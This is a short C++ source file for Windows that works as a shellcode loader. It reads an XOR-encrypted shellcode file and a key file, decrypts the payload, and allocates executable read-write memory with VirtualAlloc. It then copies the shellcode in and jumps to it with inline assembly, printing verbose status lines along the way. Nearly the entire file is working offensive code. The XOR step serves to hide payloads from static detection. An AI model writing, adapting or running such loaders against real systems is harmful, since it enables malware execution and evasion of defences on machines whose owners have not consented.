#include <windows.h>
#include <iostream>
#include "../shared/futils.hpp"
#include "../shared/crypto.hpp"

#define VERBOSE 1

int main(int argc, char **argv)
{
    if (argc != 3)
    {
        std::cout << "[?] Usage: " << argv[0] << " <shellcode-path> <xor-keyfile-path>" << std::endl;
        return 1;
    }

#ifdef VERBOSE
    std::cout << "[+] Reading shellcode from " << argv[1] << std::endl;
#endif

    auto shellcodeContents = ReadFromFile(argv[1]);

#ifdef VERBOSE
    std::cout << "[+] Reading XOR key from " << argv[2] << std::endl;
#endif

    auto key = ReadFromFile(argv[2]);

#ifdef VERBOSE
    std::cout << "[+] XOR'ing shellcode" << std::endl;
#endif

    XorCipher(shellcodeContents, key);

    auto baseAddress = VirtualAlloc(nullptr, shellcodeContents.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!baseAddress)
    {
        std::cout << "[!] Failed to allocate memory" << std::endl;
        return 1;
    }

#ifdef VERBOSE
    std::cout << "[+] Allocated " << shellcodeContents.size() << " bytes at " << baseAddress << std::endl;
#endif

    std::copy(shellcodeContents.begin(), shellcodeContents.end(), static_cast<char *>(baseAddress));

#ifdef VERBOSE
    std::cout << "[+] Copied shellcode to " << baseAddress << std::endl;
    std::cout << "[+] Executing 'jmp " << baseAddress << "'" << std::endl;
#endif

    __asm__("jmp *%0" ::"r"(baseAddress));

    return 0;
}
